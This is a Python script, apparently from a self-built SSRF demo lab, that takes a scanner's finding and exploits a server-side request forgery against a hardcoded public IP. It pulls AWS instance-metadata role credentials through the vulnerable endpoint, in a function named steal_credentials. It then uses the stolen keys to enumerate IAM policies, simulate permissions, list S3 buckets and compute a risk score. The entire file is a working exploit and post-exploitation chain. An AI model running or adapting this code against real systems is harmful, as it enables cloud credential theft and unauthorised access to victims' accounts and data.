"""
Blast-Radius Analyzer

Takes a confirmed SSRF-to-metadata finding (from scanner.py's scan_results.json),
steals the role's temporary credentials through the actual vulnerable endpoint,
then uses those stolen credentials to enumerate exactly what the role can access
via IAM policy inspection and iam:SimulatePrincipalPolicy, producing a risk score.
"""

import requests
import boto3
import json
from datetime import datetime, timezone

TARGET_BASE = "http://35.172.250.28:8000"
SCAN_RESULTS_FILE = "scan_results.json"
OUTPUT_FILE = "blast_radius_results.json"
KNOWN_BUCKET_NAME = "ssrf-demo-shana-2026"  # used to test resource-scoped S3 actions correctly

# A representative set of actions to test reachability against via policy simulation.
# Extend this list if your role/policies use other services.
CANDIDATE_ACTIONS = [
    "s3:GetObject",
    "s3:PutObject",
    "s3:DeleteObject",
    "s3:ListBucket",
    "s3:ListAllMyBuckets",
    "lambda:InvokeFunction",
    "lambda:ListFunctions",
    "iam:ListRoles",
    "iam:PassRole",
    "sts:AssumeRole",
    "ec2:DescribeInstances",
    "secretsmanager:GetSecretValue",
]


# ---- Step 1: Pull the confirmed metadata-reachable finding from the scan ----

def get_exploitable_finding():
    with open(SCAN_RESULTS_FILE) as f:
        data = json.load(f)

    for finding in data.get("findings", []):
        metadata_check = finding.get("metadata_check")
        if metadata_check and metadata_check.get("metadata_reachable"):
            return {
                "url": finding["url"],
                "param": finding["param"],
                "role_name": metadata_check["role_name"],
            }
    return None


# ---- Step 2: Steal the temporary credentials through the real SSRF endpoint ----

def steal_credentials(base_url, param, role_name):
    metadata_creds_url = (
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    )
    resp = requests.get(base_url, params={param: metadata_creds_url}, timeout=5)
    resp.raise_for_status()
    return json.loads(resp.text)


# ---- Step 3: Enumerate what the stolen role can actually do ----

def get_role_policies(iam_client, role_name):
    attached = iam_client.list_attached_role_policies(RoleName=role_name)
    inline = iam_client.list_role_policies(RoleName=role_name)

    policy_documents = []

    for policy in attached["AttachedPolicies"]:
        detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
        version_id = detail["Policy"]["DefaultVersionId"]
        version = iam_client.get_policy_version(
            PolicyArn=policy["PolicyArn"], VersionId=version_id
        )
        policy_documents.append({
            "name": policy["PolicyName"],
            "type": "managed",
            "document": version["PolicyVersion"]["Document"],
        })

    for policy_name in inline["PolicyNames"]:
        doc = iam_client.get_role_policy(RoleName=role_name, PolicyName=policy_name)
        policy_documents.append({
            "name": policy_name,
            "type": "inline",
            "document": doc["PolicyDocument"],
        })

    return {
        "attached_managed_policies": [p["PolicyName"] for p in attached["AttachedPolicies"]],
        "inline_policies": inline["PolicyNames"],
        "policy_documents": policy_documents,
    }


def simulate_permissions(iam_client, role_arn, actions, known_bucket_name=None):
    """Use iam:SimulatePrincipalPolicy to check which candidate actions are actually allowed.

    IMPORTANT: SimulatePrincipalPolicy evaluates each action against a resource.
    Without ResourceArns, it defaults to "*", which makes resource-scoped grants
    (e.g. s3:GetObject on one specific bucket) show up as denied even though the
    role genuinely has that permission on that bucket. So we test S3 object/bucket
    actions against the known bucket's ARN specifically, and everything else
    against "*" (appropriate for actions like iam:ListRoles or sts:AssumeRole,
    which aren't scoped to a particular resource in this role's policy anyway).
    """
    allowed = []
    denied = []

    s3_object_actions = {"s3:GetObject", "s3:PutObject", "s3:DeleteObject"}
    s3_bucket_actions = {"s3:ListBucket"}

    for action in actions:
        if known_bucket_name and action in s3_object_actions:
            resource_arns = [f"arn:aws:s3:::{known_bucket_name}/*"]
        elif known_bucket_name and action in s3_bucket_actions:
            resource_arns = [f"arn:aws:s3:::{known_bucket_name}"]
        else:
            resource_arns = ["*"]

        response = iam_client.simulate_principal_policy(
            PolicySourceArn=role_arn,
            ActionNames=[action],
            ResourceArns=resource_arns,
        )

        for result in response["EvaluationResults"]:
            decision = result["EvalDecision"]  # "allowed" | "explicitDeny" | "implicitDeny"
            if decision == "allowed":
                allowed.append(action)
            else:
                denied.append({"action": action, "decision": decision, "tested_resource": resource_arns})

    return allowed, denied


def list_reachable_s3_buckets(allowed_actions, creds):
    """If s3:ListAllMyBuckets is allowed, actually enumerate bucket names for a concrete finding."""
    if "s3:ListAllMyBuckets" not in allowed_actions:
        return []

    session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["Token"],
    )
    s3 = session.client("s3")
    try:
        resp = s3.list_buckets()
        return [b["Name"] for b in resp["Buckets"]]
    except Exception:
        return []


# ---- Step 4: Risk scoring ----

def calculate_risk_score(allowed_actions, policy_documents, reachable_buckets):
    score = 0
    reasons = []

    severity_weights = {
        "s3:GetObject": 10,
        "s3:ListBucket": 5,
        "s3:ListAllMyBuckets": 15,
        "s3:PutObject": 20,
        "s3:DeleteObject": 25,
        "lambda:InvokeFunction": 25,
        "lambda:ListFunctions": 10,
        "iam:ListRoles": 15,
        "iam:PassRole": 35,
        "sts:AssumeRole": 30,
        "ec2:DescribeInstances": 10,
        "secretsmanager:GetSecretValue": 35,
    }

    for action in allowed_actions:
        weight = severity_weights.get(action, 10)
        score += weight
        reasons.append(f"Allowed: {action} (+{weight})")

    # Wildcard actions in raw policy documents are an extra flag regardless of
    # whether they showed up in the candidate-action simulation above.
    for policy in policy_documents:
        statements = policy["document"].get("Statement", [])
        if isinstance(statements, dict):
            statements = [statements]
        for stmt in statements:
            if stmt.get("Effect") != "Allow":
                continue
            actions = stmt.get("Action", [])
            if isinstance(actions, str):
                actions = [actions]
            for action in actions:
                if action == "*" or action.endswith(":*"):
                    score += 30
                    reasons.append(f"Wildcard action in policy '{policy['name']}': {action} (+30)")

    if reachable_buckets:
        score += 5 * len(reachable_buckets)
        reasons.append(f"{len(reachable_buckets)} S3 bucket(s) enumerated: {reachable_buckets} (+{5 * len(reachable_buckets)})")

    if score >= 80:
        level = "CRITICAL"
    elif score >= 40:
        level = "HIGH"
    elif score >= 15:
        level = "MEDIUM"
    else:
        level = "LOW"

    return {"score": score, "level": level, "reasons": reasons}


# ---- Orchestration ----

def run_blast_radius_analysis():
    exploitable = get_exploitable_finding()
    if not exploitable:
        print("No metadata-reachable finding in scan_results.json. Run scanner.py first.")
        return None

    print(f"Exploiting finding: {exploitable['url']} (param={exploitable['param']}), role={exploitable['role_name']}")

    creds = steal_credentials(exploitable["url"], exploitable["param"], exploitable["role_name"])
    print(f"Credentials stolen. Expires: {creds['Expiration']}")

    session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["Token"],
    )
    sts = session.client("sts")
    iam = session.client("iam")

    identity = sts.get_caller_identity()
    role_arn = identity["Arn"]
    # STS caller identity ARN for an assumed role looks like:
    # arn:aws:sts::<account>:assumed-role/<role-name>/<session-name>
    # IAM calls need the actual role name and its IAM ARN, not the STS one.
    role_name = role_arn.split("/")[-2] if ":assumed-role/" in role_arn else exploitable["role_name"]

    policies = get_role_policies(iam, role_name)

    # Build the IAM role ARN (not the STS assumed-role ARN) for policy simulation
    account_id = identity["Account"]
    iam_role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"

    allowed_actions, denied_actions = simulate_permissions(
        iam, iam_role_arn, CANDIDATE_ACTIONS, known_bucket_name=KNOWN_BUCKET_NAME
    )
    reachable_buckets = list_reachable_s3_buckets(allowed_actions, creds)

    risk = calculate_risk_score(allowed_actions, policies["policy_documents"], reachable_buckets)

    report = {
        "analysis_timestamp": datetime.now(timezone.utc).isoformat(),
        "exploited_endpoint": exploitable["url"],
        "exploited_param": exploitable["param"],
        "stolen_identity_arn": role_arn,
        "iam_role_arn": iam_role_arn,
        "credential_expiration": creds["Expiration"],
        "attached_managed_policies": policies["attached_managed_policies"],
        "inline_policies": policies["inline_policies"],
        "allowed_actions": allowed_actions,
        "denied_actions": [d["action"] for d in denied_actions],
        "reachable_s3_buckets": reachable_buckets,
        "risk_assessment": risk,
    }

    return report


if __name__ == "__main__":
    report = run_blast_radius_analysis()
    if report:
        print(json.dumps(report, indent=2, default=str))
        with open(OUTPUT_FILE, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\nSaved to {OUTPUT_FILE}")